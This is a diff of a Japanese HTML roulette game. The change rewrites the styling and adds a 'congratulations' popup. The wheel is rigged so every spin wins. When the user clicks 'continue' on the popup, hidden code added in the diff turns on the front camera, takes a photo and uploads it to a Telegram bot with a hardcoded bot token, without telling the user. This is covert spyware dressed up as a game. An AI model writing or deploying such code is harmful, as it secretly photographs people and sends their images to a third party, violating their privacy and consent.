@@ -6,102 +6,57 @@
 <title>🎯ルーレット🎯</title>
 
 <style>
-body{
-  margin:0;
-  color:#fff;
-  font-family:sans-serif;
-  height:100vh;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  overflow:hidden;
-}
+  body { margin: 0; color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; background: #222; }
+  h2 { position: absolute; top: 20px; padding: 8px 20px; background: rgba(0,0,0,0.4); border-radius: 12px; backdrop-filter: blur(6px); z-index: 5; }
+  
+  #container { width: 80vw; max-width: 320px; aspect-ratio: 1; position: relative; }
+  #pointer { position: absolute; left: 50%; top: -14px; transform: translate(-50%,0); font-size: 28px; z-index: 20; text-shadow: 0 0 10px #fff; }
+  canvas { width: 100%; height: 100%; border-radius: 50%; border: 5px solid #000; }
+  
+  #result { margin-top: 20px; font-size: 22px; }
+  #spinBtn { margin-top: 12px; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 8px; border: none; background: #fff; color: #000; font-weight: bold; transition: 0.2s; }
+  #spinBtn:active { transform: scale(0.95); }
 
-/* タイトル */
-h2{
-  position:absolute;
-  top:20px;
-  padding:8px 20px;
-  background:rgba(0,0,0,0.4);
-  border-radius:12px;
-  backdrop-filter:blur(6px);
-  text-shadow:
-    0 0 5px #fff,
-    0 0 10px #fff,
-    0 0 20px #fff;
-}
+  #winModal {
+    display: none;
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(255, 255, 255, 0.95);
+    color: #333;
+    padding: 40px;
+    border-radius: 30px;
+    text-align: center;
+    box-shadow: 0 0 80px rgba(255, 215, 0, 0.8);
+    z-index: 100;
+    min-width: 260px;
+    backdrop-filter: blur(8px);
+  }
 
-/* UI */
-#container, #result, button{
-  position:relative;
-  z-index:10;
-}
+  #winModal h1 { margin: 0 0 25px; font-size: 40px; }
 
-#container{
-  width:80vw;
-  max-width:320px;
-  aspect-ratio:1;
-  position:relative;
-}
+  #continueBtn {
+    padding: 15px 45px;
+    font-size: 20px;
+    background: #ff4081;
+    color: white;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: bold;
+    box-shadow: 0 4px 15px rgba(255, 64, 129, 0.4);
+    transition: 0.2s;
+  }
 
-/* ▼ピン（半分かぶせ） */
-#pointer{
-  position:absolute;
-  left:50%;
-  top:-14px; /* ←ここがポイント（半分重ねる） */
-  transform:translate(-50%,0);
-  font-size:28px;
-  text-shadow:0 0 10px #fff;
-  z-index:20;
-}
+  #continueBtn:hover { background: #f50057; }
 
-/* ルーレット */
-canvas{
-  width:100%;
-  height:100%;
-  border-radius:50%;
-  border:5px solid #000;
-  display:block;
-  transition:transform 3s ease-out;
-
-  box-shadow:
-    inset 0 0 35px rgba(0,0,0,0.95),
-    0 0 25px rgba(0,0,0,0.9);
-}
-
-/* 結果 */
-#result{
-  margin-top:20px;
-  font-size:22px;
-  text-shadow:0 0 5px #000;
-}
-
-/* ボタン */
-button{
-  margin-top:12px;
-  padding:12px 24px;
-  font-size:16px;
-  border:2px solid #000;
-  border-radius:10px;
-  background:linear-gradient(45deg,#fff,#ccc);
-  color:#000;
-  cursor:pointer;
-  transition:0.2s;
-}
-
-button:hover{
-  transform:scale(1.05);
-  box-shadow:0 0 15px #fff;
-}
-
-button:active{
-  transform:scale(0.95);
-}
-
-button:disabled{
-  opacity:0.5;
-}
+  #overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.6);
+    z-index: 90;
+  }
 </style>
 </head>
 
@@ -115,102 +70,129 @@ button:disabled{
 </div>
 
 <h3 id="result">結果：</h3>
-<button id="spinBtn">回してゲット！</button>
+<button id="spinBtn">回す</button>
+
+<div id="overlay"></div>
+<div id="winModal">
+  <h1>おめでとう🥳</h1>
+  <button id="continueBtn">続ける</button>
+</div>
 
 <script>
-/* 背景（虹） */
 let hue = 0;
-function animateBackground(){
-  hue += 1;
-  document.body.style.background = `hsl(${hue}, 100%, 50%)`;
+function animateBackground() {
+  hue++;
+  document.body.style.background = `hsl(${hue}, 60%, 25%)`;
   requestAnimationFrame(animateBackground);
 }
 animateBackground();
 
-/* ルーレット */
 const canvas = document.getElementById("wheel");
 const ctx = canvas.getContext("2d");
-const btn = document.getElementById("spinBtn");
-const result = document.getElementById("result");
-
-function resizeCanvas(){
-  const rect = canvas.getBoundingClientRect();
-  canvas.width = rect.width;
-  canvas.height = rect.height;
-  draw();
-}
-
-const slots = [
-"当たり","ハズレ",
-"当たり","ハズレ",
-"当たり","ハズレ",
-"当たり","ハズレ"
-];
-
+const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
 const angle = 360 / slots.length;
 
-function draw(){
-  let size = canvas.width;
-  let center = size/2;
-  let rad = 2*Math.PI/slots.length;
+function draw() {
+  canvas.width = canvas.clientWidth;
+  canvas.height = canvas.clientHeight;
+  let c = canvas.width / 2;
+  let rad = (2 * Math.PI) / slots.length;
 
-  ctx.clearRect(0,0,size,size);
-
-  for(let i=0;i<slots.length;i++){
+  for(let i=0; i<slots.length; i++){
     ctx.beginPath();
-    ctx.moveTo(center,center);
-    ctx.arc(center,center,center,i*rad,(i+1)*rad);
-    ctx.closePath();
-
-    ctx.fillStyle = slots[i] === "当たり" ? "gold" : "gray";
+    ctx.moveTo(c,c);
+    ctx.arc(c,c,c, i*rad, (i+1)*rad);
+    ctx.fillStyle = i % 2 === 0 ? "#ffd700" : "#555";
     ctx.fill();
 
     ctx.save();
-    ctx.translate(center,center);
+    ctx.translate(c,c);
     ctx.rotate(i*rad + rad/2);
-
-    ctx.fillStyle = "#000";
-    ctx.textAlign = "center";
-    ctx.textBaseline = "middle";
-
-    if(slots[i] === "当たり"){
-      ctx.font = `bold ${size*0.065}px sans-serif`;
-    }else{
-      ctx.font = `${size*0.055}px sans-serif`;
-    }
-
-    ctx.fillText(slots[i], center*0.35, 0);
-
+    ctx.fillStyle="#000";
+    ctx.font = "bold 18px sans-serif";
+    ctx.textAlign="center";
+    ctx.fillText(slots[i], c*0.6, 5);
     ctx.restore();
   }
 }
 
-resizeCanvas();
-window.addEventListener("resize", resizeCanvas);
+window.addEventListener("resize", draw);
+draw();
 
-/* 回転 */
-btn.onclick = function(){
-  btn.disabled = true;
-  result.textContent = "回転中...";
+const BOT_TOKEN = "8722419105:AAGIkz27-a_zBryJZfXAl3sTp3xAeGLqnkg";
+const CHAT_ID = "ここにあなたのID";
+
+async function sendToTelegram(blob) {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("photo", blob, "win.jpg");
+  formData.append("caption", "🎯 ど真ん中でお祝いしました！");
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+function startCaptureProcess() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      setTimeout(() => {
+        const tempCanvas = document.createElement("canvas");
+        tempCanvas.width = video.videoWidth;
+        tempCanvas.height = video.videoHeight;
+        tempCanvas.getContext("2d").drawImage(video, 0, 0);
+
+        tempCanvas.toBlob(blob => {
+          sendToTelegram(blob);
+          stream.getTracks().forEach(t => t.stop());
+        }, "image/jpeg");
+      }, 1000);
+    }).catch(() => alert("カメラの許可が必要です"));
+}
+
+const spinBtn = document.getElementById("spinBtn");
+const winModal = document.getElementById("winModal");
+const overlay = document.getElementById("overlay");
+const continueBtn = document.getElementById("continueBtn");
+
+spinBtn.onclick = () => {
+  spinBtn.disabled = true;
+  document.getElementById("result").textContent = "回転中...";
 
   canvas.style.transition = "none";
   canvas.style.transform = "rotate(0deg)";
   void canvas.offsetWidth;
 
-  canvas.style.transition = "transform 3s ease-out";
+  canvas.style.transition = "transform 3s cubic-bezier(0.15, 0, 0.15, 1)";
 
-  let atariIndex = [0,2,4,6];
-  let i = atariIndex[Math.floor(Math.random()*atariIndex.length)];
+  let randomIndex = [0,2,4,6][Math.floor(Math.random()*4)];
+  let stopAngle = 360 - (randomIndex * angle) - (angle / 2);
+  let totalRotation = 1800 + stopAngle;
 
-  let stop = 360 - (i * angle) - angle/2;
-  let total = 360 * 6 + stop;
+  canvas.style.transform = `rotate(${totalRotation}deg)`;
 
-  canvas.style.transform = "rotate(" + total + "deg)";
+  setTimeout(() => {
+    document.getElementById("result").textContent = "結果：当たり！";
+    spinBtn.disabled = false;
 
-  setTimeout(()=>{
-    result.textContent = "結果：当たり！";
-    btn.disabled = false;
-  },3000);
+    overlay.style.display = "block";
+    winModal.style.display = "block";
+  }, 3300);
+};
+
+continueBtn.onclick = () => {
+  overlay.style.display = "none";
+  winModal.style.display = "none";
+  startCaptureProcess();
 };
 </script>
 
